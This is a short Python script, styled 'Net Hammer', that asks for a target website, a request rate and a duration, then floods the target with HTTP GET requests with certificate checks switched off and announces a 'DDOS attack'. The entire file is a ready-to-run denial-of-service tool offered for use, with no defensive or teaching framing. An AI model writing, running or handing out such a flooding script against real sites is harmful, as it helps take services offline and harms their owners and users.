import requests
import time
from rich.console import Console
from rich.text import Text
from rich.panel import Panel
from rich import print
from urllib3 import disable_warnings

console = Console()

def banner():
    ascii_art = """
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@'~~~     ~~~`@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@'                     `@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@'                           `@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@'                               `@@@@@@@@@@@@@@@
@@@@@@@@@@@'                                   `@@@@@@@@@@@@@
@@@@@@@@@@'                                     `@@@@@@@@@@@@
@@@@@@@@@'                                       `@@@@@@@@@@@
@@@@@@@@@                                         @@@@@@@@@@@
@@@@@@@@'                      n,                 `@@@@@@@@@@
@@@@@@@@                     _/ | _                @@@@@@@@@@
@@@@@@@@                    /'  `'/                @@@@@@@@@@ 
@@@@@@@@a                 &lt;~    .'             a@@@@@@@@@@
@@@@@@@@@                 .'    |                 @@@@@@@@@@@
@@@@@@@@@a              _/      |                a@@@@@@@@@@@
@@@@@@@@@@a           _/      `.`.              a@@@@@@@@@@@@
@@@@@@@@@@@a     ____/ '   \__ | |______       a@@@@@@@@@@@@@
@@@@@@@@@@@@@a__/___/      /__\ \ \     \___.a@@@@@@@@@@@@@@@
@@@@@@@@@@@@@/  (___.'\_______)\_|_|        \@@@@@@@@@@@@@@@@
@@@@@@@@@@@@|\________                       ~~~~~\@@@@@@@@@@
"""
    text = Text(ascii_art, justify="center", overflow="ellipsis")
    text.stylize("bold red")
    panel = Panel(text, title="Net Hammer", subtitle="Crushing Networks with Precision and Power", border_style="red")
    console.print(panel)

# Get user input
target = input("Enter the target website: ")
requests_per_second = int(input("Enter the number of requests to send per second: "))
attack_duration = int(input("Enter the duration of the attack in seconds: "))

# Disable SSL certificate verification
disable_warnings()

# Start the attack
print("Starting DDOS attack...")
banner()
start_time = time.time()

while time.time() - start_time < attack_duration:
    for _ in range(requests_per_second):
        try:
            requests.get(target, verify=False)
        except Exception as e:
            print(e)
    time.sleep(1)

print("DDOS attack finished.")
